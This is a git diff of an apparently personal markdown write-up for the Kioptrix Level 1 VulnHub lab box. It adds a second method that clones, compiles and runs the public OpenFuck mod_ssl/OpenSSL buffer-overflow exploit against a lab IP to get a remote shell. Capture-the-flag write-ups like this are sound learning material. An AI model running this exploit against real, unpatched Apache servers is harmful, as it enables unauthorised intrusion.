@@ -7,10 +7,10 @@
  If you find my words idiotic ,well im an idiot : 0 
 
 
-- You can find this Box in here or you can find in the resources on the youtube video description
+- You can find this Box in [**here**](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) or you can find in the resources on the youtube video description
 
 ``` 
-https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
+
 ```
 - The Main Objective is to achieve root access to this machine.
 
@@ -422,14 +422,52 @@ kioptrix.level1
 
 **Done You have got a shell!**
 
-I'll Add more ways to exploit this box ! there are 2 more ways you can get a shell  
+
+## OpenLuck - Method Two
+We will use a github repository which contain exploit for the **"Apache mod_ssl< 2.8.7 OpenSSL - Remote Buffer Overflow"**
+
+```
+git clone https://github.com/heltonWernik/OpenFuck.git
+
+```
+Install ssl-dev library
+
+```
+apt install libssl-dev
+cd OpenFuck
+
+```
+Compile  OpenFuck.c
+
+```
+gcc -o OpenFuck OpenFuck.c -lcrypto
+```
+Usage : 
+```
+./OpenFuck [Target] [Box] [port] [-c N]
+
+| Target - Supported Box eg: 0x00
+| Box - hostname or IP Address
+| port - port for ssl connection
+| -c open N connection (Use Range 40-50 if you don't know)
+```
+Run
+
+```
+ ./OpenFuck  0x6b 192.168.57.4 -c 40
+```
+
+**And we'll get a shell!**
+
+Learned so many things doing this.yeah even though it's an easy machine i felt kind of diffcult trying to do it by myself so i did pause and saw how heath is doing in his videos and also some other peoples writeups helped me to get more knowledge about what is 
+
+I didn't take screen shots while doing this thing .I'll be putting screenshots for other machines📷
 
 
+**Have fun guys! and yeah i like coffee too ☕** 
 
-
-
-
-
-
+```
+1 Down 5 to go
+```
 
 
